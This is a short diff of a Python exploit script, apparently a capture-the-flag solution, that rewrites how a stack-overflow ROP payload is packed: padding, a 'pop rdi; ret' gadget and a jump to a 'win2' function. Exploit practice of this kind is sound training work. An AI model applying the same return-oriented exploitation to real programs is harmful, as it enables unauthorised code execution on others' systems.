@@ -33,7 +33,10 @@ def attack(conn, args, **kwargs):
     print(f"Found pop rdi; ret at: {hex(rop_gadget.address)}")
 
     exploit =  b'a' * 0x10
-    exploit += struct.pack('<QQQQ', 0xdeadbeef, rop_gadget.address, 0xcafebabe, binf.functions['win2'].address)
+    exploit += struct.pack('<Q', 0x00000000deadbeef)
+    exploit += struct.pack('<Q', rop_gadget.address)
+    exploit += struct.pack('<Q', 0x00000000cafebabe)
+    exploit += struct.pack('<Q', binf.functions['win2'].address)
 
     conn.sendline(exploit)
     print(conn.recvall().decode())
